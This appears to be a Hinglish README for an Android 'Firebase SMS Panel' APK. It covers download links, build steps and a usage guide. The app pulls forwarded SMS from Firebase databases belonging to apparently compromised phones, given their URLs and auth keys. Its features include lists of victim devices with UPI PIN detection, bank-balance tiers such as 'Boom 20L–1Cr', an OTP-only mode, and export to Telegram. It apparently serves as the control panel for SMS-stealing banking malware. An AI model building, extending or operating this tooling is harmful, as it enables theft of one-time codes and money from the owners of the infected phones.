# Firebase SMS Panel (standalone APK)

Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB URLs → HTTPS parallel fetch → device list. Har SMS par **sender ID** clearly.

## Signed APK

**Download (latest signed, v1.0.9):**  
`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.9-release-signed.apk`

**Signed** — phone pe “Install unknown apps” allow karo. Older: `FirebaseSmsPanel-1.0-release-signed.apk` (purana build).

### Build locally (2 min)

Keystore **GitHub pe upload mat karo** — apne PC par banao:

```bash
cd firebase-sms-panel-app
mkdir -p signing
keytool -genkeypair -v -keystore signing/release.keystore -alias firebasepanel \
  -keyalg RSA -keysize 2048 -validity 10000
cp keystore.properties.example keystore.properties
# keystore.properties me paths + passwords edit karo
./gradlew assembleRelease
```

**Output:** `app/build/outputs/apk/release/app-release.apk` — ye **signed** hai (v2/v3).

Unsigned (agar `keystore.properties` na ho): same path pe build **unsigned** banta hai — Gradle signing optional hai.

Optional (unsigned, agar repo me rakha ho):  
`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0-release-unsigned.apk`
## Build

1. Android Studio (latest) → **Open** → `firebase-sms-panel-app`
2. Gradle sync → Run / Build APK  
   (Pehli sync pe Gradle wrapper scripts ban sakte hain.)

## Use

1. **TXT** → **Virtus format** (same as Virtus Panel Viewer Pro `assets/index.html`): har panel ke liye **Firebase URL** line + **Auth Key** line (`KEY:`, `Secret:`, `token:` …). Plain URL-only lines bhi chalengi agar DB **public read** ho. Load ke turant baad **auto-fetch nahi** — pehle filters set karo.
2. **Fetch Live** → 45s auto-refresh ON + immediate fetch (same filters).
3. **Start Fetch** → pehla pull ya dubara pull (URLs load hone ke baad, filters ke saath).
4. **Export TXT** → filtered device list share (Telegram/Drive).
5. **Search Here** + right pe **connection chip** (tap = Online → Offline → Both cycle). **Default = Both** taaki panel “offline” dikhne par bhi SMS list na khali ho. Agar kuch na dikhe lekin progress me **SMS count** ho — filter tight hai → **Full inbox** ya **All** SMS age try karo; orange hint line bhi dikhegi.
6. **Dark dashboard** (Virtus screenshot jaisa): top row **TXT + Export TXT** (panel count), second row full-width **Fetch Live** (text squeeze nahi hota); metrics cards, pills: **High 1L-20L, Boom 20L-1Cr, Medium 5K, Low→High**, PIN, sort ₹/Battery, SMS age. **App icon** = tumhara **Virtus GT SMS MODULE** logo.
7. **Live SMS** — **yellow** strip, white cards (**MSG** green). **Devices** — main dark screen par Virtus WebView jaisa **dark card**: green border online, **#** + gradient icon, device id + PIN badge + ₹ balance, lines Phone/UPI/Battery/**Bank SMS (filtered / raw)**, Date, Status; **Info** + ★. Detail sheet tap par (**yellow**).
8. **Bank+Band tiers** — presets: **High 1L–20L**, **Boom 20L–90L** (label “1Cr style”), **Medium 5K–1L**, **Low→High 2K–50K**. **All bank** = purana 50K–90L / 2K–50K High/Low sort (no tier preset).
9. **Sort list by** (bank modes): **₹** ya **Battery %** (devices jo filters se pass ho).
10. **Virtus-style dashboard** — cards: DEVICES, ONLINE, BALANCE, BANK SMS, PANELS; **Live SMS** = filtered recent messages.
11. **Inbox mode (pills)** — Bank+Band / All bank / OTP / Full (same behavior as before).
12. **PIN filter** — Bank modes: With / Without / Both (device-level UPI/PIN detection).
13. **SMS age** — `1d` … `30d` ya **All** (timestamp missing = still shown).
14. **Live refresh** — **Fetch Live** = 45s job ON.
15. **Device Details** — card tap ya **Info (i)**; **yellow** background, white card: **Balance (fetch)**, battery, SIM, forwarder, UPI PIN, SMS list (green MSG). Fetch ke baad line: **… panels · N SMS** (kitna data aaya). **v1.0.9** — `messages/<deviceId>/...` path fix (pehle galat id se 0 devices).

### Virtus fetch (auth + `clients` + `messages`)

- **Secret key:** Har request `...json?auth=<Auth Key>` (Drive APK jaisa).
- Pehle **`clients.json`** — device ids + model/battery/status.
- Phir har device: **`messages/<deviceId>.json`** — pehle `orderBy="$key"&limitToLast=3500`, khali ho to poora node.

Bina key ke sirf **public** DB ka data aayega; warna TXT me **KEY:** line add karo.

## Data

- Har fetch me zyada SMS lane ke liye deep JSON walk + timeout badhaya; cap ~**8000** SMS/DB (OOM se bachne ke liye). Same JSON walk se `devices/...` nodes se **model, battery, SIM, lastSeen** jaisi fields pick hoti hain jahan Firebase tree me milti hain.
- **Live** = app ko dubara sync karna; SMS tab dikhenge jab phone/WMS Firebase ko update kare.

## Notes

- **Auth Key** ke saath **rules read** ho; bina key **public** read wale projects hi chalenge.
- OTP mode spam short-links hata hai; baaki telco sender IDs match karne ki koshish.
